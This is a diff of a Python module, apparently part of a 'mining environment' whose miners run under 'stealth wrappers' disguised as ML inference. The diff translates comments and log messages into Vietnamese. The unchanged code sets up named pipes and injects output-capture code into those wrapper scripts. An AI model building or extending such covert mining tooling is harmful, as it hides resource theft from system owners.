@@ -2,7 +2,7 @@
 """
 mining_output_bridge.py
 
-Enhanced Mining Output Bridge - Cầu nối để capture mining output thật từ stealth wrappers
+**[Enhanced Mining Output Bridge]** (cầu nối đầu ra khai thác nâng cao) - Cầu nối để **[capture]** (bắt) **[mining output]** (đầu ra khai thác) thật từ **[stealth wrappers]** (trình bao bọc ẩn danh)
 """
 
 import os
@@ -14,7 +14,7 @@ import signal
 import logging
 from pathlib import Path
 
-# Thiết lập logging
+# Thiết lập **[logging]** (ghi nhật ký)
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
 
@@ -27,27 +27,27 @@ logger.setLevel(logging.INFO)
 
 def create_mining_output_forwarder(process_type: str, target_pid: int):
     """
-    Tạo forwarder để capture mining output thật và forward tới PID Logger
+    Tạo **[forwarder]** (bộ chuyển tiếp) để **[capture]** (bắt) **[mining output]** (đầu ra khai thác) thật và **[forward]** (chuyển tiếp) tới **[PID Logger]** (trình ghi PID)
     
     Args:
         process_type: 'cpu' hoặc 'gpu'
-        target_pid: PID của mining process cần monitor
+        target_pid: **[PID]** (Process ID - mã định danh tiến trình) của **[mining process]** (tiến trình khai thác) cần **[monitor]** (giám sát)
     """
-    logger.info(f"🔗 Creating mining output forwarder for {process_type} PID {target_pid}")
+    logger.info(f"🔗 Tạo **[mining output forwarder]** (bộ chuyển tiếp đầu ra khai thác) cho {process_type} PID {target_pid}")
     
-    # Tạo named pipe để communication
+    # Tạo **[named pipe]** (đường ống có tên) để **[communication]** (giao tiếp)
     pipe_path = f"/tmp/mining_output_{process_type}_{target_pid}.pipe"
     
     try:
-        # Tạo named pipe
+        # Tạo **[named pipe]** (đường ống có tên)
         if os.path.exists(pipe_path):
             os.unlink(pipe_path)
         os.mkfifo(pipe_path)
-        logger.info(f"📡 Created named pipe: {pipe_path}")
+        logger.info(f"📡 Đã tạo **[named pipe]** (đường ống có tên): {pipe_path}")
         
-        # Monitor script để đọc từ pipe và forward tới log files
+        # **[Monitor script]** (kịch bản giám sát) để đọc từ **[pipe]** (đường ống) và **[forward]** (chuyển tiếp) tới **[log files]** (tệp nhật ký)
         def monitor_pipe():
-            logger.info(f"🔍 Starting pipe monitor for {process_type} PID {target_pid}")
+            logger.info(f"🔍 Bắt đầu **[pipe monitor]** (giám sát đường ống) cho {process_type} PID {target_pid}")
             
             output_log_path = f"{LOGS_DIR}/{process_type}_mining_output.log"
             
@@ -74,7 +74,7 @@ def create_mining_output_forwarder(process_type: str, target_pid: int):
                                 logger.info(f"✅ Captured mining output: {line.strip()}")
                             
             except Exception as e:
-                logger.error(f"❌ Error in pipe monitor for {process_type}: {e}")
+                logger.error(f"❌ Lỗi trong **[pipe monitor]** (giám sát đường ống) cho {process_type}: {e}")
         
         # Start monitor thread
         monitor_thread = threading.Thread(target=monitor_pipe, daemon=True)
@@ -83,7 +83,7 @@ def create_mining_output_forwarder(process_type: str, target_pid: int):
         return pipe_path
         
     except Exception as e:
-        logger.error(f"❌ Failed to create mining output forwarder: {e}")
+        logger.error(f"❌ Thất bại khi tạo **[mining output forwarder]** (bộ chuyển tiếp đầu ra khai thác): {e}")
         return None
 
 def inject_output_capture(process_type: str, wrapper_script_path: str):
@@ -105,7 +105,7 @@ def inject_output_capture(process_type: str, wrapper_script_path: str):
         backup_path = f"{wrapper_script_path}.backup"
         if not os.path.exists(backup_path):
             subprocess.run(['cp', wrapper_script_path, backup_path], check=True)
-            logger.info(f"📁 Created backup: {backup_path}")
+            logger.info(f"📁 Đã tạo **[backup]** (bản sao): {backup_path}")
         
         # Read original wrapper content
         with open(wrapper_script_path, 'r') as f:
@@ -169,19 +169,19 @@ if __name__ == "__main__":
             with open(wrapper_script_path, 'w') as f:
                 f.write(modified_content)
                 
-            logger.info(f"✅ Successfully injected output capture into {wrapper_script_path}")
+            logger.info(f"✅ Thành công khi inject output capture vào {wrapper_script_path}")
             return True
         else:
-            logger.error(f"❌ Could not find import section in {wrapper_script_path}")
+            logger.error(f"❌ Không thể tìm thấy phần **[import]** (nhập khẩu) trong {wrapper_script_path}")
             return False
             
     except Exception as e:
-        logger.error(f"❌ Failed to inject output capture: {e}")
+        logger.error(f"❌ Thất bại khi inject output capture: {e}")
         return False
 
 def main():
     """Main function để setup mining output bridge"""
-    logger.info("🚀 Starting Mining Output Bridge")
+    logger.info("🚀 Bắt đầu **[Mining Output Bridge]** (cầu nối đầu ra khai thác)")
     
     # Setup forwarders cho cả CPU và GPU
     cpu_wrapper = "/app/mining_environment/stealth/wrappers/stealth_ml_inference.py"
